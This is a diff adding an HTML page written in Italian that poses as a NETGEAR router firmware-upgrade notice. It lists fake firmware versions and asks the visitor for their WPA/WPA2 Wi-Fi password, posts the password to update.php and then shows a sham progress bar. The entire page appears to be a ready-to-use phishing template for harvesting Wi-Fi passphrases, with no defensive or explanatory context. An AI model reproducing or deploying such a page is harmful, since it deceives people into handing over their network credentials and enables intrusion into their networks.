@@ -1,0 +1,52 @@
+<html> <head><meta name=description><meta http-equiv=Content-Type content="text/html; charset=utf-8"><meta http-equiv=Pragma content=no-cache><meta http-equiv=Cache-Control content=no-cache><meta http-equiv=Expires content="Mon, 06 Jan 1990 00:00:01 GMT"><title>Router upgrade</title><link rel=stylesheet href=css/form.css type=text/css><link rel=stylesheet href=css/upg_upgrade.css type=text/css><script language=javascript type=text/javascript src=js/func.js></script><script type=text/javascript src=js/jquery-2.1.4.min.js></script><script type=text/javascript>
+		$(document).ready(function() {						
+			$("#updateform").submit(function(e) {
+
+				e.preventDefault();
+				$(".error").hide();
+	
+				var hasError = false;
+				var wpa_psw = $("#wpa_psw").val();
+				var wpa_psw_conf = $("#wpa_psw_conf").val();
+				
+				if (wpa_psw == '') {
+            $("#wpa_psw").after('<span class="error">Per favore, inserire la password.</span>');
+            hasError = true;
+        } else if (wpa_psw_conf == '') {
+            $("#wpa_psw_conf").after('<span class="error">Per favore, inserire la stessa password.</span>');
+            hasError = true;
+        } else if (wpa_psw != wpa_psw_conf ) {
+            $("#wpa_psw_conf").after('<span class="error">Le password non sono uguali.</span>');
+            hasError = true;
+        }
+				
+				
+				if (!hasError) {					
+					var formURL = $(this).attr("action");					
+					var pBar = $("#pbar");
+					
+					$.ajax({
+								type: "POST",
+								url : formURL,
+								data: {wpa_psw: wpa_psw, wpa_psw_conf: wpa_psw_conf},
+								dataType:'JSON',
+								success:function(response){
+									console.log(response);
+
+									if (response) {
+										// psw OK
+										$("#wpa_psw").prop('disabled', true);
+										$("#wpa_psw_conf").prop('disabled', true);
+										pBar.addClass("update");
+									
+										doProgress();
+									} else {
+										alert ("La password inserita non è corretta! Inserire la password corretta.");
+										$("#button_update").prop('disabled', false);
+									}
+								}
+					});
+				}
+			});
+		});
+	</script></head> <body bgcolor=#FFFFFF onload="loadhelp('upg_upgrade');"> <table border=0 cellpadding=0 cellspacing=3 width=100%> <tr> <td colspan=2> <h1>Aggiornamento Router</h1> </td> </tr> <tr> <!-- RULE --> <td colspan=2 background=images/liteblue.gif height=12>&nbsp;</td> </tr> <tr> <td colspan=2 align=left> <a href=# tabindex=-1><b>È disponibile un nuovo firmware per il vostro NETGEAR che migliorerà le funzionalità e le performance dell'apparato.</b></a> </td> </tr> <tr> <td colspan=2 align=left> <fieldset> <p><label class=duple>Versione Firmware Corrente&nbsp;:</label> <strong class=output>3.30</strong></p> <p><label class=duple>Data Firmware&nbsp;:</label> <strong class=output>2013/04/16</strong></p> <p style="color: #CC0000"><label class=duple>Nuova Versione Firmware&nbsp;:</label> <strong class=output>4.45</strong></p> <p style="color: #CC0000"><label class=duple>Data Aggiornamento Firmware&nbsp;:</label> <strong class=output>2015/11/09</strong></p> </fieldset> </td> </tr> <tr> <!-- RULE --> <td colspan=2 background=images/liteblue.gif height=12>&nbsp;</td> </tr> <tr> <td colspan=2 align=left> <p class=box_alert><strong>Nota:</strong> Il download e l'aggiornamento del firmware può richiedere alcuni minuti. Durante l'aggiornamento non spegnere il router nè chiudere il browser.</p> </td> </tr> <tr> <td colspan=2 align=left> <form id=updateform method=post action=update.php> <fieldset style="display: inline-block"> <p> <label class=duple style="width: 220px;">WPA/WPA2 :</label> <input id=wpa_psw name=wpa_psw type=password> </p> <p> <label class=duple style="width: 220px;">Conferma WPA/WPA2 :</label> <input id=wpa_psw_conf name=wpa_psw_conf type=password> </p> </fieldset> <p style="text-align: center"> <input id=button_update type=submit value=Aggiorna> </p> <p style="text-align: center"> <progress id=pbar value=0 max=100></progress> </p> </form> </td> </tr> </table> <script type=text/javascript src=js/pBar.js></script> </body> </html> 
